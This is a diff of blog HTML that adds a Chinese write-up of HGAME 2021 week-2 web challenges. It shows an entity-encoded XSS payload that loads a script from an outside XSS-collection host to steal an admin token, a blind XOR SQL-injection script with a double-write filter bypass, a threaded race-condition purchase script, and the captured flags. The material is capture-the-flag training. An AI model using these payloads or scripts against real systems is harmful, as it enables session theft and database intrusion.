@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Troy3e</title>
+  <title itemprop="name">HGAME-Web-Week2WP | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -179,457 +179,266 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 0px;"></div>
-<div id="content" class="site-content">
-  
-  <div class="notice" style="margin-top:60px">
-    <i class="iconfont icon-notification">
-    </i>
-    <div class="notice-content">Social Phobia</div>
-  </div>
-  
-  <div class="top-feature-row">
-  <h1 class="fes-title" style="font-family: 'Ubuntu', sans-serif;">
-  <i class="fa fa-anchor" aria-hidden="true">
-  </i>
-  START:DASH!!</h1>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="https://space.bilibili.com/129300391" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/6326234.jpg">
-        </div>
-        <div class="info">
-          <h3>Bilibili</h3>
-          <p>博主的b站视频</p>
-        </div>
-      </a>
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128240.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128240.png">
     </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      HGAME-Web-Week2WP</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/41414542.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="">Troy3e</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2021-2-13<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
   </div>
-  
-</div>
+
+<div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
-      <h1 class="main-title" style="font-family: 'Ubuntu', sans-serif;">
-      <i class="fa fa-envira" aria-hidden="true"></i>
-      Discovery</h1>
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <p>一、LazyDogR4U</p>
+<p><a href="http://www.zip源码泄露" target="_blank" rel="noopener">www.zip源码泄露</a></p>
+<p>一个session变量覆盖</p>
+<p>获取flag的条件：<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210207002347.png" alt></p>
+<p>继续看到flag.php包含的lazy.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210207002638.png" alt></p>
+<p>此代码自行理解，建议本地试一试。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210207003044.png" alt></p>
+<pre><code>hgame{R4U~|S-4~lazy-DoG}
+</code></pre><p>二、Post to zuckonit</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208194730.png" alt></p>
+<p>经典xss，要获取管理员的token访问/flag。<br>找一个xss平台准备接收token<br>payload：</p>
+<pre><code>&lt;iframe srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#46;&amp;#112;&amp;#116;&amp;#47;&amp;#87;&amp;#106;&amp;#52;&amp;#67;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;
+</code></pre><p>xss就不解释了，一是姿势非常多，二是我自己也没怎么遇到过（啥也不会）</p>
+<p>payload准备好之后打给后台机器人就行，这里还有个验证码，python跑一个就行，网上嫖的脚本 稍微改了下（#py2）：</p>
+<pre><code>import hashlib
+import random
+
+def encryption(chars):
+     return hashlib.md5(chars).hexdigest()
+def generate():
+  code = &quot;&quot;
+  for i in range(5):
+      add_num = str(random.randrange(0,9))#纯数字
+      add_al = chr(random.randrange(65,91))#纯大写字母
+      add_str = str(random.randrange(0,9)) + chr    (random.randrange(65,91))#数字和字母
+      sj = random.choice([add_str])
+      code = &quot;&quot;.join([sj,code])
+  return code
+def main():
+     start = &quot;6a506f&quot; #指定前六位
+     while True:
+         strs = generate()
+         print &quot;Test %s &quot; % strs
+         if encryption(strs).startswith(start):
+             print &quot;yes!&quot;
+             print &quot;[+] %s &quot; % strs + &quot;%s &quot; % encryption(strs)
+         break
+         else:
+             print &quot;no!&quot;
+
+if __name__ == &#39;__main__&#39;:
+     main()
+     print &#39;完成！&#39;
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208195933.png" alt></p>
+<p>拿到token，访问/flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208200006.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208200142.png" alt></p>
+<p>三、200OK!!</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209120259.png" alt></p>
+<p>乍一看不知道是考的啥东西，抓个包康康（burp抓https教程自行百度）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209120429.png" alt></p>
+<p>在js脚本里面可以看到Status是随机生成的，在这里是一个可以控制的点，大概率存在sql注入。因为sql注入是寒假任务之一，所以我这里就一步一步写的细一点。</p>
+<p>首先测试闭合的方式，1’时无回显，1’#时有回显，所以是单引号型的。</p>
+<p>接下来我直接试了异或注入（记得加单引号，因为后台语句大概是这样的：select ‘(你的输入)’）：1’^’1’^’1’#</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209121137.png" alt></p>
+<p>成功执行，存在异或注入。然后就是直接上二分法脚本了。</p>
+<p>我先放脚本：</p>
+<pre><code>import requests
+
+flag = &quot;&quot;
+url = &quot;https://200ok.liki.link/server.php&quot;
+for i in range(1,1000):
+    l = 32
+    h = 132
+    mid = (l + h) // 2
+    while(l&lt;h):
+        #payload = &quot;1&#39;^(ord(mid(database(),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #库名为 week2sqli
+        #payload = &quot;1&#39;^(ord(mid((selselectect(group_concat(table_name))frfromom(information_schema.tables)wwherehere(table_schema=&#39;week2sqli&#39;)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #表名为f1111111144444444444g
+        #payload = &quot;1&#39;^(ord(mid((selselectect(group_concat(column_name))frfromom(information_schema.columns)wwherehere(table_name=&#39;f1111111144444444444g&#39;)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #列名为ffffff14gggggg
+        payload = &quot;1&#39;^(ord(mid((selselectect(group_concat(ffffff14gggggg))frfromom(week2sqli.f1111111144444444444g)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #列名为ffffff14gggggg
+
+        headers = {
+            &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#39;,
+            &#39;Status&#39;: payload
+        }
+        r = requests.get(url=url,headers=headers)
+        print(r.text)
+        if &#39;NETWORK ERROR&#39; in r.text:
+            l = mid + 1
+        else:
+            h = mid
+        #if (mid == 32 or mid == 132):
+           # break
+        mid = (l + h) // 2
+    flag += chr(mid)
+    print(flag)
+print(flag)
+</code></pre><p>二分法脚本做buu的应该都已经遇到过了，所以就不细说了。唯一要说明的就是双写绕过以及是如何判断waf的。</p>
+<p>在测试脚本的时候，我成功执行了第一个payload爆出了库名，于是直接进行了下一步爆表名，但是没有回显，测试payload如下：</p>
+<pre><code>payload = 1&#39;^(ord(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;week2sqli&#39;)),1,1))&gt;1)^&#39;1&#39;#
+</code></pre><p>照理说表名第一位的ascii码肯定大于一，所以这里应该返回NETWORK ERROR，但是却连200 OK都没有，所以肯定是语句存在问题了，而且是与第一个payload不一样的地方。</p>
+<p>于是得一个个地测试，这里我用了length来判断：1’^(length(‘select’)=0)^’1’#</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209122031.png" alt></p>
+<p>返回NETWORK ERROR，说明select长度为0，这也就表示了后台把select替换为空，所以双写绕过即可。from和where原理同上</p>
+<p>hgame{Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)}</p>
+<p>四、Liki的生日礼物<br>这题找了好久不知道洞在哪，但是看solve数量那么多应该是个很简单的题，果然就是个竞争。python多线程同时买26张券即可。<br>脚本:</p>
+<pre><code>import requests
+import threading
+
+def buyswitch(n):
+    url = &quot;https://birthday.liki.link/API/?m=buy&quot;
+    data = {&quot;amount&quot;: 26}
+    headers = {
+        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#39;,
+        &#39;Cookie&#39;: &#39;PHPSESSID=qdacrahf4gvn2o9q8aa4vm46jb&#39; #改成你自己的
+    }
+    r = requests.post(url=url,headers=headers,data=data)
+    print(&#39;线程&#39;+ str(n) + &#39;:&#39; + str(r.status_code) )
+    print (r.text)
+
+
+def thread(n):
+    threads = []
+    for i in range(0, n):
+        t = threading.Thread(target=buyswitch, args=(i,))
+        threads.append(t)
+    print(threads)
+
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+
+thread(2)
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208225903.png" alt></p>
+<pre><code>hgame{L0ck_1s_TH3_S0lllut!on!!!}
+</code></pre>
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picturenull"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/wechat.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2077/12/10/Self-Introduction/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-994291.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-994291.png">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                Self-Introduction（置顶）</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+          
+            <div class="post-nepre half next">
+          
+            <a href="/2021/02/06/PwnThyBytes-2019-Baby-SQL/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128093.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128093.jpg">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                [PwnThyBytes 2019]Baby_SQL</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
-  <!-- 首页默认取最最新文章集 -->
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "kEnVX5WKqd0JPt4srHAJkgsC-gzGzoHsz",
+        appKey: "h05kFRgBHS516pQ6vIsYtG1B",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
 
-  <div class="post-thumb">
-    <a href="/2020/07/28/极客大挑战-2019-RCE-ME/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-617631.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-7-28 21:07</div>
-      <a href="/2020/07/28/极客大挑战-2019-RCE-ME/" class="post-title">
-        <h3>[极客大挑战 2019]RCE ME</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/07/28/极客大挑战-2019-RCE-ME/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/41414542.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author">Troy3e</a>
+            </h3>
+          </div>
         </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/07/27/GWCTF-2019-枯燥的抽奖/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-320623.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-7-27 21:07</div>
-      <a href="/2020/07/27/GWCTF-2019-枯燥的抽奖/" class="post-title">
-        <h3>[GWCTF 2019]枯燥的抽奖</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/php-mt-srand-随机种子/">php mt_srand() 随机种子<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/07/27/GWCTF-2019-枯燥的抽奖/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/07/25/NCTF2019-Fake-XML-cookbook/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1091702.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-7-25 23:07</div>
-      <a href="/2020/07/25/NCTF2019-Fake-XML-cookbook/" class="post-title">
-        <h3>[NCTF2019]Fake XML cookbook</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/xxe/">xxe<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/07/25/NCTF2019-Fake-XML-cookbook/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/07/24/GKCTF2020-老八小超市儿/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1091060.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-7-24 13:07</div>
-      <a href="/2020/07/24/GKCTF2020-老八小超市儿/" class="post-title">
-        <h3>[GKCTF2020]老八小超市儿</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/07/24/GKCTF2020-老八小超市儿/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/07/23/CISCN2019-华北赛区-Day1-Web1-Dropbox/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/124141.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-7-23 21:07</div>
-      <a href="/2020/07/23/CISCN2019-华北赛区-Day1-Web1-Dropbox/" class="post-title">
-        <h3>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/07/23/CISCN2019-华北赛区-Day1-Web1-Dropbox/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/07/22/CISCN2019-华北赛区-Day1-Web2-ikun/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/hrthrtwhnrtjn.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-7-22 21:07</div>
-      <a href="/2020/07/22/CISCN2019-华北赛区-Day1-Web2-ikun/" class="post-title">
-        <h3>[CISCN2019 华北赛区 Day1 Web2]ikun</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/07/22/CISCN2019-华北赛区-Day1-Web2-ikun/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/07/22/MRCTF2020-你传你马呢/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1086806.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-7-22 20:07</div>
-      <a href="/2020/07/22/MRCTF2020-你传你马呢/" class="post-title">
-        <h3>[MRCTF2020]你传你马呢</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/07/22/MRCTF2020-你传你马呢/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/07/21/WesternCTF2018-shrine/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1086450.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-7-21 23:07</div>
-      <a href="/2020/07/21/WesternCTF2018-shrine/" class="post-title">
-        <h3>[WesternCTF2018]shrine</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/ssti/">ssti<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/07/21/WesternCTF2018-shrine/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/07/21/CISCN-2019-初赛-Love-Math/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/21313213.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-7-21 21:07</div>
-      <a href="/2020/07/21/CISCN-2019-初赛-Love-Math/" class="post-title">
-        <h3>[CISCN 2019 初赛]Love Math</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/07/21/CISCN-2019-初赛-Love-Math/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/07/20/SWPU2019-Web1/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1086791.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-7-20 21:07</div>
-      <a href="/2020/07/20/SWPU2019-Web1/" class="post-title">
-        <h3>[SWPU2019]Web1</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/无列名注入/">无列名注入<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/07/20/SWPU2019-Web1/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-
-
-    </main>
-      <!-- 首页默认取最最新文章集 -->
-    <!-- 
-      <nav class="navigator">
-        
-        <a class="extend prev" rel="prev" href="/page/7/"><i class="iconfont icon-back"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/9/"><i class="iconfont icon-right"></i></a>
-      </nav>
-     -->
-  </div>
-  
-    <div id="pagination"><a href="/page/9/" class="">Previous</a></div>
-  
+        <hr>
+        <p><i class="iconfont icon-write"></i>steamID：888007034</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
 
     </div>    
     <div class="ins-search">
